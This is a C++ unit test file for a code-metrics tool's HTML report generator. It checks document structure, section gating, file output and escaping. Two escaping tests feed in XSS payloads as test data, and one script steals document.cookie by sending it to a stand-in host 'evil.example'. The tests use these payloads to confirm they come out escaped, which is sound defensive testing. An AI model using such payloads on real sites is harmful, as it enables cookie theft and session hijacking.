// Unit tests for the Phase 4 Sprint 4 static shareable HTML report
// (P1-2 from the competitive R&D report backlog): ReportGenerator's
// toHtml()/saveHtmlToFile() overloads, escaping/injection safety, and
// arity-gated section presence (dependencies/hotspots/violations/health
// badge only appear on the full 5-arg overload, mirroring the JSON
// path's "healthScore requires a HotspotReport*" rule).
 
#include "report/ReportGenerator.h"
 
#include <gtest/gtest.h>
 
#include <cstdlib>
#include <fstream>
#include <regex>
#include <sstream>
 
using namespace cma;
 
namespace {
 
int countTag(const std::string& html, const std::string& tag) {
    // Matches "<tag" followed by a space or '>' (avoids "<table" matching
    // "<tablewhatever"), same discrimination the balance check needs for
    // void-free tags used in this report (html/head/body/table/thead/
    // tbody/tr/td/th/section/div/title/style -- no <meta>/<br> counted).
    std::regex openRe("<" + tag + "( |>)");
    auto begin = std::sregex_iterator(html.begin(), html.end(), openRe);
    auto end   = std::sregex_iterator();
    int opens = static_cast<int>(std::distance(begin, end));
    int closes = 0;
    std::string closeTag = "</" + tag + ">";
    std::size_t pos = 0;
    while ((pos = html.find(closeTag, pos)) != std::string::npos) {
        ++closes;
        pos += closeTag.size();
    }
    return (opens == closes) ? opens : -1; // -1 signals mismatch to caller
}
 
bool tagsBalanced(const std::string& html) {
    static const char* kTags[] = {
        "html", "head", "body", "table", "thead", "tbody",
        "tr", "td", "th", "section", "div", "title", "style"
    };
    for (const char* tag : kTags) {
        if (countTag(html, tag) < 0) return false;
    }
    return true;
}
 
ProjectMetrics makeProject() {
    ProjectMetrics pm;
    pm.filesAnalyzed = 1;
    pm.totalLines = 10;
    pm.codeLines = 8;
    pm.cyclomaticComplexity = 3;
    return pm;
}
 
} // namespace
 
TEST(ReportGeneratorHtml, EmptyProjectProducesWellFormedBalancedDocument) {
    const auto html = ReportGenerator::toHtml(ProjectMetrics{}, {});
    EXPECT_TRUE(tagsBalanced(html));
    EXPECT_NE(html.find("<!DOCTYPE html>"), std::string::npos);
    EXPECT_NE(html.find("Code Metrics Report"), std::string::npos);
}
 
TEST(ReportGeneratorHtml, TwoArgOutputNeverContainsHealthBadgeOrDependencyOrHotspotOrViolationSections) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
 
    const auto html = ReportGenerator::toHtml(pm, files);
    EXPECT_EQ(html.find("<svg"), std::string::npos);
    EXPECT_EQ(html.find("id=\"dependencies\""), std::string::npos);
    EXPECT_EQ(html.find("id=\"hotspots\""), std::string::npos);
    EXPECT_EQ(html.find("id=\"violations\""), std::string::npos);
    EXPECT_EQ(html.find("Code Health"), std::string::npos);
}
 
TEST(ReportGeneratorHtml, FiveArgOutputIncludesHealthBadgeAndAllFourSections) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
 
    DependencyGraph graph;
    FileCoupling fc; fc.path = "main.cpp"; fc.fanOut = 1; fc.dependsOn = {"foo.h"};
    graph.files.push_back(fc);
 
    HotspotReport hotspots;
    hotspots.gitAvailable = true;
    FileHotspot fh; fh.path = "main.cpp"; fh.hotspotScore = 42.0;
    hotspots.files.push_back(fh);
 
    ViolationReport violations;
    Violation v; v.path = "main.cpp"; v.line = 3; v.ruleId = "cpp-raw-new-delete";
    v.language = "cpp"; v.severity = "info"; v.message = "test message";
    violations.violations.push_back(v);
 
    const auto html = ReportGenerator::toHtml(pm, files, graph, hotspots, violations);
    EXPECT_TRUE(tagsBalanced(html));
    EXPECT_NE(html.find("<svg"), std::string::npos);
    EXPECT_NE(html.find("Code Health"), std::string::npos);
    EXPECT_NE(html.find("id=\"dependencies\""), std::string::npos);
    EXPECT_NE(html.find("id=\"hotspots\""), std::string::npos);
    EXPECT_NE(html.find("id=\"violations\""), std::string::npos);
    EXPECT_NE(html.find("cpp-raw-new-delete"), std::string::npos);
}
 
TEST(ReportGeneratorHtml, GitUnavailableShowsMutedMessageNotEmptyTable) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
    DependencyGraph graph;
    HotspotReport hotspots; // gitAvailable defaults false
    ViolationReport violations;
 
    const auto html = ReportGenerator::toHtml(pm, files, graph, hotspots, violations);
    const auto section = html.substr(html.find("id=\"hotspots\""));
    EXPECT_NE(section.find("Git history not available"), std::string::npos);
    EXPECT_EQ(section.substr(0, section.find("</section>")).find("<table>"), std::string::npos);
}
 
TEST(ReportGeneratorHtml, GitUnavailableWithFallbackFilesShowsComplexityTable) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
    DependencyGraph graph;
    HotspotReport hotspots; // gitAvailable defaults false
    FileHotspot fh; fh.path = "deep.cpp"; fh.cyclomaticComplexity = 17; fh.maxNestingDepth = 6;
    fh.hotspotScore = 100.0;
    hotspots.files.push_back(fh);
    ViolationReport violations;

    const auto html = ReportGenerator::toHtml(pm, files, graph, hotspots, violations);
    const auto section = html.substr(html.find("id=\"hotspots\""));
    const auto body = section.substr(0, section.find("</section>"));
    EXPECT_NE(body.find("Git history not available"), std::string::npos);
    EXPECT_NE(body.find("<table>"), std::string::npos);
    EXPECT_NE(body.find("Max Nesting"), std::string::npos);
    EXPECT_NE(body.find("deep.cpp"), std::string::npos);
    EXPECT_EQ(body.find("Commits"), std::string::npos);
}

TEST(ReportGeneratorHtml, EmptyViolationsShowsMutedMessageNotEmptyTable) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
    DependencyGraph graph;
    HotspotReport hotspots;
    ViolationReport violations; // empty
 
    const auto html = ReportGenerator::toHtml(pm, files, graph, hotspots, violations);
    const auto section = html.substr(html.find("id=\"violations\""));
    EXPECT_NE(section.find("No violations detected"), std::string::npos);
}
 
// ---- Escaping / injection safety -- the risk unique to HTML output ----
 
TEST(ReportGeneratorHtmlEscaping, ScriptTagInFilePathNeverAppearsUnescaped) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("<script>alert(1)</script>.cpp", FileMetrics{});
 
    const auto html = ReportGenerator::toHtml(pm, files);
    EXPECT_EQ(html.find("<script>alert(1)</script>"), std::string::npos);
    EXPECT_NE(html.find("&lt;script&gt;alert(1)&lt;/script&gt;"), std::string::npos);
    EXPECT_TRUE(tagsBalanced(html));
}
 
TEST(ReportGeneratorHtmlEscaping, ScriptTagInViolationMessageNeverAppearsUnescaped) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
    DependencyGraph graph;
    HotspotReport hotspots;
    ViolationReport violations;
    Violation v;
    v.path = "main.cpp"; v.line = 1; v.ruleId = "x"; v.language = "cpp";
    v.severity = "info";
    v.message = "\"><script>document.location='http://evil.example/'+document.cookie</script>";
    violations.violations.push_back(v);
 
    const auto html = ReportGenerator::toHtml(pm, files, graph, hotspots, violations);
    EXPECT_EQ(html.find("<script>document.location"), std::string::npos);
    EXPECT_NE(html.find("&lt;script&gt;"), std::string::npos);
    EXPECT_TRUE(tagsBalanced(html));
}
 
TEST(ReportGeneratorHtmlEscaping, QuoteAndAmpersandEscapedInDependencyPath) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("a&b\"c.h", FileMetrics{});
    DependencyGraph graph;
    FileCoupling fc; fc.path = "a&b\"c.h";
    graph.files.push_back(fc);
    HotspotReport hotspots;
    ViolationReport violations;
 
    const auto html = ReportGenerator::toHtml(pm, files, graph, hotspots, violations);
    EXPECT_NE(html.find("a&amp;b&quot;c.h"), std::string::npos);
    EXPECT_TRUE(tagsBalanced(html));
}
 
// ---- File I/O ----
 
TEST(ReportGeneratorHtml, SaveHtmlToFileTwoArgMatchesToHtml) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
 
    const auto expected = ReportGenerator::toHtml(pm, files);
    const std::string path = "/tmp/cma_test_html_report_output.html";
    ASSERT_TRUE(ReportGenerator::saveHtmlToFile(pm, files, path));
 
    std::ifstream in(path);
    ASSERT_TRUE(in.is_open());
    std::ostringstream buf;
    buf << in.rdbuf();
    EXPECT_EQ(buf.str(), expected);
    std::remove(path.c_str());
}
 
TEST(ReportGeneratorHtml, SaveHtmlToFileFiveArgMatchesToHtml) {
    ProjectMetrics pm = makeProject();
    std::vector<std::pair<std::string, FileMetrics>> files;
    files.emplace_back("main.cpp", FileMetrics{});
    DependencyGraph graph;
    HotspotReport hotspots;
    ViolationReport violations;
 
    const auto expected = ReportGenerator::toHtml(pm, files, graph, hotspots, violations);
    const std::string path = "/tmp/cma_test_html_report_full_output.html";
    ASSERT_TRUE(ReportGenerator::saveHtmlToFile(pm, files, graph, hotspots, violations, path));
 
    std::ifstream in(path);
    ASSERT_TRUE(in.is_open());
    std::ostringstream buf;
    buf << in.rdbuf();
    EXPECT_EQ(buf.str(), expected);
    std::remove(path.c_str());
}
 
TEST(ReportGeneratorHtml, SaveHtmlToFileFailsOnUnwritablePath) {
    EXPECT_FALSE(ReportGenerator::saveHtmlToFile(ProjectMetrics{}, {},
                                                  "/nonexistent_dir_xyz/report.html"));
}
